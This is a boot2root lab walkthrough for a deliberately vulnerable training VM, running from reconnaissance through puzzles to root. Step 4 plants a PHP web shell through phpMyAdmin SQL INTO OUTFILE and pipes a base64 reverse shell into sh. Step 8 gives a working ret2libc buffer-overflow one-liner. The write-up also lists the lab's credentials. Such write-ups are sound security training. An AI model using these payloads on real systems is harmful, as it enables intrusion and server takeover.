# Boot2Root -- Professor Layton

## Step 0 - Hacker mode
![it's payday](figs/payday2.gif)

Turn your terminal green, shut the lights off, put on your mask
Turn some hardbass on, pump up the volume. Here we go

## Step 1 - Find the server
We don't have the server IP.
We run `nmap -sn <mask>` to enumerate servers responding to ping.

Fortunately, we find an IP different from ours that responds to ping.

## Step 2 - Enumerer
### Host and services
Now, we run `nmap -p- -A -sV -T4 <ip>` to gather maximum information about the server.

We discover various services:
- `ftp` on port 21 (`vsftpd 2.0.8` or later)
- `ssh` on port 22 (`OpenSSH 5.9p1`)
- `http`(s) on ports 80 and 443 (`Apache httpd 2.2.22`)
- `imap`(s) on ports 143 and 993 (`Dovecot imapd`)

We keep the log handy in the event it provides additional useful information.

### HTTP
We decide to start with the HTTP(S) server.
We run `nikto` on port 80, but it doesn't yield significant results.
Trying in HTTPS, we obtain more information.

Different routes are found:
- `/forum`
- `/phpmyadmin`
- `/webmail`
Most of these routes give us leads to explore.

#### PHPMyAdmin
We choose to explore PHPMyAdmin.

Going to the `/phpmyadmin` route, we find two interesting pieces of information:
- The image URL contains a token `token=3e6cab1c9cf8cda6115b523f5d6b353`
- Clicking the login form's help button reveals the `PHPMyAdmin` version: `3.4.10.1`

From the help page, we deduce additional information:
- PHP version 5.2.0 minimum
- MySQL Version 5.0 minimum
- PHP ZIP extension

#### Webmail
Next, we check the webmail.
On the `/webmail` route, the homepage displays `squirrelmail` version `1.4.22`.

#### Forum
We proceed to inspect the forum.

We identify the forum software: `my little forum`.

Clicking the `Users` link, we discover the ability to send emails to `admin`.
There's also a contact form, a potential spot to exploit.

## Step 3 - Poteaux
While enumerating posts, we find one titled
> Probleme login ?
containing SSH logs. We observe that someone successfully connected via
SSH as the user `admin` and that we can also connect as `root`.

We list the different forum users:
- `admin`
- `lmezard`
- `qudevide`
- `zaz`
- `wandre`
- `thor`

In the SSH logs, we find a password in the line:
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
Even if in the logs `!q\]Ej?*5K5cy*AJ` is considered as a user, we deduce it might be a password.

After trying this password with all known users (SSH and forum),
we find it belongs to the forum user `lmezard`.

From lmezard's user page, we discover the email address laurie@borntosec.net.

We attempt to log in to their webmail via the `/webmail` route with the same password,
and it works!

We read the DB Access email containing credentials
`root:Fg-'kKXBj87E:aJ$` presumably for the database or PHPMyAdmin.

We successfully log in to PHPMyAdmin, but efforts to identify password hashes are unsuccessful.
Promoting lmezard to admin on the forum doesn't help that much either...

## Step 4 - Reverse shell
After extensive searching and experimentation, we devise a plan:

Use the PHPMyAdmin query console to create a PHP reverse shell and execute it through the webserver user.
The challenge is not knowing where to write and execute a script.

We download the corresponding version of `my little forum` found on the admin's `Update` page, version 2.3.4.
(Being a admin turned out to be useful)

We attempt to explore the forum's directory structure, mirroring what we downloaded.
The seemingly only path that allows us to execute PHP is `/forum/templates_c/<file>.php`.

We try writing there, starting with `phpinfo()` for testing
Supposing that the forum is in `/var/www/forum`

```SQL
SELECT '<?php phpinfo() ?>' INTO OUTFILE "/var/www/forum/templates_c/info_file.php"
```
It works! Accessing `https://<ip>/forum/templates_c/info_file.php` shows PHP information.

Next, we create a file that listens for the `cmd` query parameter, executes it in a shell, and returns the result:

```SQL
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```
(located in `scripts/shell.php`)

We access `https://<ip>/forum/templates_c/shell.php?cmd=whoami` to test, and it returns `www-data`, indicating success.

Further exploration reveals Python's presence (which python returns a positive result).

We try a known Python reverse shell script (found in `scripts/shell.py.sh`).
As a precaution against problematic characters, we encode it in base64 and URL encode the following command
```
printf "<reverse shell en base64>" | base64 -d | sh
```
This decodes the base64 and executes it in `sh`.

Simultaneously, we launch netcat in listening mode on our side with the command:
```
nc -nlvp <PORT>
```

Running the script using our PHP file, and it works!

We stabilize the shell using the following protocol:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
then CTRL-Z
```
stty raw -echo; fg
```
and finally
```
export TERM=xterm
```

Now, we have a clean reverse shell on the server.

## Step 5 - Sanitize

On the server, we explore a bit.
Our first interesting find is in /home - the folder LOOKATME is the only accessible directory.
Inside, we find a password file giving us credentials: lmezard:G!@M6f4Eatau{sF" .

We try these credentials for SSH and FTP, and FTP is successful. Exploring the available files, we find two: fun and README.

We download them to our machine, and the README indicates a puzzle:
> Complete this little challenge and use the result as password for user 'laurie' to login in ssh

Using `file` command on the `fun` file, we determine it's a tar archive.
We extract it and inspect the contents.

We find many PCAP files containing portions of a C program. The files are out of order but numbered.
Using the `scripts/puzzles/merge.py` script, we reorder and concatenate them into a single file.

We clean up unwanted data with sanitize.sh and do some manual processing.
We compile the program, run it and voila:

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

We proceed as indicated, which gives us this password for `laurie`
(mdp: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`)

From laurie's account, we find two files: `bomb` and `readme`, another puzzle...

## Step 6 - Da bomb
The bomb consists of 6 levels, each with its own password.
thor's password corresponds to the 6 codes side by side.

Our initial thought is to decompile the code using `radare2` and `Ghidra`, based on our preferences.

Some levels are relatively simple, just containing a plain text string,
while others involve more complex algorithms.

We wrote the codes in the `scripts/puzzles/defuser.py` script,
which includes either hard-coded solutions or the reverse algorithm to obtain the code.

The only truly complex level is 6, where we guessed that the code
is a combination of 6 unique numbers ranging from 1 to 6 and that starts by 4.

We then implemented a script to defuse the bomb by trying out all possible combinations.
However, despite successfully defusing the bomb, the password doesn't seem to work...
(see `defuser.bash` and `defuser.py`)

### Secret phase
After numerous attempts and troubleshooting:

Upon examining the decompiled code, we discovered the existence of a secret phase
accessible by adding "austinpowers" to the 4th phase.
Although we couldn't find the password for the secret phase,
experimenting with substitutions of the level 6 password led us to this password for thor:

> Publicspeakingisveryeasy.126241207201b2149opekmq426135

This part is quite peculiar, and no other student seem to have really figured it out on their own.
Every time, the password appears magically...

## Step 7 - Tourne et retourne
We encounter a file with instructions.
The filename and instructions easily lead us to believe it's code for the turtle library in Python.
We convert the instructions into code using a few sed commands,
execute it, and observe `SLASH`.

Towards the end of the file, it says:
> Can you digest this message

We deduce that we should compute an MD5 digest of the message. This gives us
`646da671ca01bb5d84dbb5fb2238dc8e` as a password for zaz.

![super nickel](figs/super_nickel.gif)

Super nickel !

## Step 8 - Piscine a débordement

We come across an executable named `exploit_me`.
Decompiling it reveals that it only performs a `strcpy` of the user input into a limited buffer
and prints it. This sets the stage for a buffer overflow.

We educate ourselves on how to proceed.
With a bit of exploration using `radare2` and `gdb`,
we identify the addresses for `system()` and `/bin/sh`.
This leads us to the following shellcode:
```
./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7AAAA\x58\xcc\xf8\xb7')"`
```

![cpt](figs/cpt.gif)

And voila, we are root.

## Sources
Buffer overflow: https://beta.hackndo.com/buffer-overflow/
reverse shell Oneliners: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
Stabilize a reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
